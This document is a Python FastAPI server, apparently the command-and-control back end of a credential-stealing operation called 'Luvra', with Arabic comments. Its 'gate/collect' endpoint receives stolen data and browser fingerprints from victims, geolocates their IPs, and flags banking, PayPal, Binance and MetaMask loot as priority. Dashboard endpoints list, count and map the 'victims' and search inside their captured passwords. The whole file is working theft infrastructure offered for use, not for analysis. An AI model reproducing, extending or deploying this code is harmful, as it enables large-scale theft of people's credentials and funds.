from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import psycopg2
from psycopg2.extras import RealDictCursor
import os, json, logging, requests
from datetime import datetime

# إعداد اللوغز
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Luvra Master Intelligence Dashboard")

# تفعيل CORS عشان واجهة لوفرا تقدر تسحب البيانات
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

DB_URL = os.environ.get("DATABASE_URL")

def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def setup_db():
    """بناء الجداول الماكس عند التشغيل"""
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("""
        CREATE TABLE IF NOT EXISTS luvra_master_intel (
            id SERIAL PRIMARY KEY,
            target_identity TEXT,
            ip_address TEXT,
            geo_info JSONB,
            browser_fingerprint JSONB,
            captured_intel JSONB,
            is_priority BOOLEAN DEFAULT FALSE,
            status TEXT DEFAULT 'active',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()
    logger.info("--- Luvra Master Analytics: Online ---")

# --- روابط الـ Analytics (واجهة التحكم) ---

@app.get("/api/v1/analytics/overview")
async def get_overview():
    """إحصائيات الصيد السريعة"""
    try:
        conn = get_db_conn()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        
        # 1. إجمالي الضحايا
        cur.execute("SELECT COUNT(*) FROM luvra_master_intel")
        total = cur.fetchone()['count']
        
        # 2. الصيدات المهمة (بنوك، كريبتو)
        cur.execute("SELECT COUNT(*) FROM luvra_master_intel WHERE is_priority = TRUE")
        priority = cur.fetchone()['count']
        
        # 3. توزيع الدول (للخريطة)
        cur.execute("SELECT geo_info->>'country' as country, COUNT(*) as count FROM luvra_master_intel GROUP BY country")
        countries = cur.fetchall()
        
        cur.close()
        conn.close()
        return {
            "stats": {"total": total, "priority": priority},
            "geo_map": countries,
            "server_time": str(datetime.now())
        }
    except Exception as e:
        return {"error": str(e)}

@app.get("/api/v1/analytics/victims")
async def list_victims(limit: int = 50):
    """عرض قائمة الضحايا مع التفاصيل الكاملة"""
    try:
        conn = get_db_conn()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        cur.execute("SELECT * FROM luvra_master_intel ORDER BY created_at DESC LIMIT %s", (limit,))
        victims = cur.fetchall()
        cur.close()
        conn.close()
        return victims
    except Exception as e:
        return {"error": str(e)}

@app.get("/api/v1/analytics/search")
async def search_intel(query: str):
    """البحث الماكس داخل الباسووردات والبيانات المسحوبة"""
    try:
        conn = get_db_conn()
        cur = conn.cursor(cursor_factory=RealDictCursor)
        # بحث احترافي داخل الـ JSONB
        cur.execute("SELECT * FROM luvra_master_intel WHERE captured_intel::text ILIKE %s", (f'%{query}%',))
        results = cur.fetchall()
        cur.close()
        conn.close()
        return results
    except Exception as e:
        return {"error": str(e)}

# --- رابط الاستلام (The Gate) ---

@app.post("/api/v1/gate/collect")
async def collect_intel(request: Request):
    client_ip = request.client.host
    try:
        payload = await request.json()
        
        # سحب معلومات الموقع عبر IP API (مجاني)
        geo_data = requests.get(f"http://ip-api.com/json/{client_ip}").json()
        
        # تحليل الأولوية تلقائياً
        intel_str = json.dumps(payload.get('intel', {})).lower()
        is_priority = any(k in intel_str for k in ["binance", "metamask", "bank", "paypal", "crypto"])

        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO luvra_master_intel (target_identity, ip_address, geo_info, browser_fingerprint, captured_intel, is_priority)
            VALUES (%s, %s, %s, %s, %s, %s)
        """, (
            payload.get('target_id', 'Unknown'),
            client_ip,
            json.dumps(geo_data),
            json.dumps(payload.get('fingerprint', {})),
            json.dumps(payload.get('intel', {})),
            is_priority
        ))
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Exfil Error: {e}")
        return {"status": "error"}
